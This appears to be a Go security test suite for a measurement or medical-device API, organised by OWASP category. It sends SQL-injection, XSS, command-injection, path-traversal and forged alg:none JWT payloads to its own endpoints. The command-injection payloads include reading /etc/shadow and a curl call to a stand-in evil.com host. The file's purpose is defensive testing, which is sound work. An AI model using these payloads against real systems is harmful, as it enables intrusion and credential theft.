package security_test

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"testing"
)

// ─── OWASP A03: Injection ───

func TestSQLInjection(t *testing.T) {
	payloads := []string{
		"' OR '1'='1",
		"'; DROP TABLE users; --",
		"' UNION SELECT * FROM users --",
		"1; DELETE FROM measurements WHERE 1=1",
		"admin'--",
		"' OR 1=1 LIMIT 1 --",
	}

	endpoints := []struct {
		method string
		path   string
		field  string
	}{
		{"POST", "/api/v1/auth/login", "email"},
		{"GET", "/api/v1/measurement/history?user_id=%s", ""},
		{"GET", "/api/v1/devices?name=%s", ""},
	}

	for _, ep := range endpoints {
		for i, payload := range payloads {
			t.Run(fmt.Sprintf("%s_payload_%d", ep.path, i), func(t *testing.T) {
				var resp *http.Response
				var err error

				if ep.method == "POST" {
					body := map[string]string{ep.field: payload, "password": "test"}
					data, _ := json.Marshal(body)
					resp, err = http.Post(baseURL+ep.path, "application/json", bytes.NewReader(data))
				} else {
					url := fmt.Sprintf(baseURL+ep.path, payload)
					resp, err = http.Get(url)
				}

				if err != nil {
					t.Skipf("요청 실패: %v", err)
					return
				}
				defer resp.Body.Close()

				// SQL 에러 메시지 노출 확인
				buf := new(bytes.Buffer)
				buf.ReadFrom(resp.Body)
				body := buf.String()

				sqlErrorPatterns := []string{
					"syntax error",
					"SQL",
					"mysql",
					"postgres",
					"ORA-",
					"SQLITE",
					"unterminated",
					"column",
				}
				for _, pattern := range sqlErrorPatterns {
					if strings.Contains(strings.ToLower(body), strings.ToLower(pattern)) {
						t.Errorf("SQL 인젝션 정보 노출: 응답에 DB 에러 포함 (pattern=%q)", pattern)
					}
				}
			})
		}
	}
}

func TestXSSInjection(t *testing.T) {
	xssPayloads := []string{
		`<script>alert('XSS')</script>`,
		`<img src=x onerror=alert(1)>`,
		`"><svg onload=alert(1)>`,
		`javascript:alert(1)`,
		`<iframe src="javascript:alert(1)">`,
	}

	for i, payload := range xssPayloads {
		t.Run(fmt.Sprintf("xss_%d", i), func(t *testing.T) {
			// 이름 필드에 XSS 페이로드 삽입 시도
			regBody := map[string]string{
				"email":    fmt.Sprintf("xss-test-%d@test.com", i),
				"password": "XssTest1!",
				"name":     payload,
			}
			data, _ := json.Marshal(regBody)
			resp, err := http.Post(baseURL+"/api/v1/auth/register", "application/json", bytes.NewReader(data))
			if err != nil {
				t.Skipf("요청 실패: %v", err)
				return
			}
			defer resp.Body.Close()

			buf := new(bytes.Buffer)
			buf.ReadFrom(resp.Body)
			body := buf.String()

			// 응답에 이스케이프되지 않은 스크립트가 포함되는지 확인
			if strings.Contains(body, "<script>") || strings.Contains(body, "onerror=") {
				t.Errorf("XSS 취약점: 응답에 이스케이프되지 않은 스크립트 태그 포함")
			}
		})
	}
}

func TestCommandInjection(t *testing.T) {
	cmdPayloads := []string{
		"; ls /etc/passwd",
		"| cat /etc/shadow",
		"`whoami`",
		"$(id)",
		"&& curl http://evil.com/",
	}

	for i, payload := range cmdPayloads {
		t.Run(fmt.Sprintf("cmd_%d", i), func(t *testing.T) {
			body := map[string]string{
				"device_id":    payload,
				"cartridge_id": "CART-GLU-001",
				"user_id":      "test-user",
			}
			data, _ := json.Marshal(body)
			resp, err := http.Post(baseURL+"/api/v1/measurement/sessions", "application/json", bytes.NewReader(data))
			if err != nil {
				t.Skipf("요청 실패: %v", err)
				return
			}
			defer resp.Body.Close()

			buf := new(bytes.Buffer)
			buf.ReadFrom(resp.Body)
			respBody := buf.String()

			// 명령 실행 결과가 응답에 포함되는지 확인
			cmdOutputPatterns := []string{"root:", "uid=", "/bin/", "shadow"}
			for _, pattern := range cmdOutputPatterns {
				if strings.Contains(respBody, pattern) {
					t.Errorf("명령 인젝션 취약점: 응답에 시스템 정보 포함 (pattern=%q)", pattern)
				}
			}
		})
	}
}

// ─── OWASP A05: Security Misconfiguration ───

func TestSecurityHeaders(t *testing.T) {
	resp, err := http.Get(baseURL + "/api/v1/health")
	if err != nil {
		t.Skipf("서버 접근 불가: %v", err)
		return
	}
	defer resp.Body.Close()

	requiredHeaders := map[string]string{
		"X-Content-Type-Options":    "nosniff",
		"X-Frame-Options":           "",   // DENY or SAMEORIGIN
		"Strict-Transport-Security": "",   // max-age 포함
		"X-XSS-Protection":          "0",  // 최신 브라우저는 0 권장 (CSP 활용)
	}

	for header, expectedValue := range requiredHeaders {
		t.Run(header, func(t *testing.T) {
			value := resp.Header.Get(header)
			if value == "" {
				t.Logf("경고: 보안 헤더 누락 (%s)", header)
			} else if expectedValue != "" && value != expectedValue {
				t.Logf("보안 헤더 값 불일치: %s = %q (expected %q)", header, value, expectedValue)
			}
		})
	}

	// CORS 헤더 검증
	t.Run("CORS", func(t *testing.T) {
		req, _ := http.NewRequest("OPTIONS", baseURL+"/api/v1/auth/login", nil)
		req.Header.Set("Origin", "http://evil.com")
		req.Header.Set("Access-Control-Request-Method", "POST")
		corsResp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Skipf("CORS 요청 실패: %v", err)
			return
		}
		defer corsResp.Body.Close()

		allowOrigin := corsResp.Header.Get("Access-Control-Allow-Origin")
		if allowOrigin == "*" {
			t.Error("CORS 취약점: Access-Control-Allow-Origin이 * (와일드카드)")
		}
	})
}

func TestServerInformationLeakage(t *testing.T) {
	resp, err := http.Get(baseURL + "/api/v1/health")
	if err != nil {
		t.Skipf("서버 접근 불가: %v", err)
		return
	}
	defer resp.Body.Close()

	// Server 헤더에 버전 정보 노출 확인
	server := resp.Header.Get("Server")
	if server != "" {
		sensitivePatterns := []string{"nginx/", "Apache/", "Go/", "kong/"}
		for _, pattern := range sensitivePatterns {
			if strings.Contains(server, pattern) {
				t.Logf("경고: Server 헤더에 버전 정보 노출 (%s)", server)
			}
		}
	}

	// X-Powered-By 헤더 확인
	poweredBy := resp.Header.Get("X-Powered-By")
	if poweredBy != "" {
		t.Logf("경고: X-Powered-By 헤더 노출 (%s)", poweredBy)
	}
}

func TestErrorDetailExposure(t *testing.T) {
	// 존재하지 않는 엔드포인트
	resp, err := http.Get(baseURL + "/api/v1/nonexistent-endpoint")
	if err != nil {
		t.Skipf("서버 접근 불가: %v", err)
		return
	}
	defer resp.Body.Close()

	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	body := strings.ToLower(buf.String())

	sensitivePatterns := []string{
		"stack trace",
		"goroutine",
		"runtime error",
		"panic",
		"internal server",
		"/home/",
		"/usr/",
		"file:",
		"line:",
	}

	for _, pattern := range sensitivePatterns {
		if strings.Contains(body, pattern) {
			t.Errorf("에러 정보 노출: 응답에 내부 정보 포함 (pattern=%q)", pattern)
		}
	}
}

// ─── OWASP A06: Vulnerable Components ───

func TestDirectoryTraversal(t *testing.T) {
	traversalPaths := []string{
		"/../../../etc/passwd",
		"/..%2F..%2F..%2Fetc%2Fpasswd",
		"/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
		"/....//....//....//etc/passwd",
	}

	for i, path := range traversalPaths {
		t.Run(fmt.Sprintf("traversal_%d", i), func(t *testing.T) {
			resp, err := http.Get(baseURL + path)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			buf := new(bytes.Buffer)
			buf.ReadFrom(resp.Body)
			body := buf.String()

			if strings.Contains(body, "root:") || strings.Contains(body, "/bin/bash") {
				t.Errorf("디렉토리 트래버설 취약점: 시스템 파일 접근 가능 (path=%q)", path)
			}
		})
	}
}

// ─── OWASP A08: Software Integrity ───

func TestJWTAlgorithmConfusion(t *testing.T) {
	// alg:none 토큰으로 접근 시도
	noneTokens := []string{
		// alg=none, sub=admin
		"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",
		// alg=HS256 with empty signature
		"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.",
	}

	for i, token := range noneTokens {
		t.Run(fmt.Sprintf("alg_confusion_%d", i), func(t *testing.T) {
			req, _ := http.NewRequest("GET", baseURL+"/api/v1/admin/users", nil)
			req.Header.Set("Authorization", "Bearer "+token)
			resp, err := http.DefaultClient.Do(req)
			if err != nil {
				t.Skipf("요청 실패: %v", err)
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK {
				t.Error("JWT 알고리즘 혼동 취약점: alg:none 또는 빈 서명 토큰이 승인됨")
			}
		})
	}
}

// ─── OWASP A09: Logging ───

func TestAuditTrailOnSensitiveActions(t *testing.T) {
	// 민감 작업 수행 후 감사 로그 생성 확인
	token := loginAndGetToken(t, "audit-test@test.com", "AuditTest1!")
	if token == "" {
		t.Skip("토큰 획득 실패")
		return
	}

	// 비밀번호 변경 시도
	pwBody := map[string]string{
		"old_password": "AuditTest1!",
		"new_password": "AuditTest2!",
	}
	data, _ := json.Marshal(pwBody)
	req, _ := http.NewRequest("PUT", baseURL+"/api/v1/auth/password", bytes.NewReader(data))
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Skipf("비밀번호 변경 요청 실패: %v", err)
		return
	}
	resp.Body.Close()

	// 감사 로그 조회 (관리자 토큰 필요 - 실제로는 admin 인증 필요)
	t.Log("감사 추적: 민감 작업(비밀번호 변경)에 대한 로그 기록 확인 필요")
}
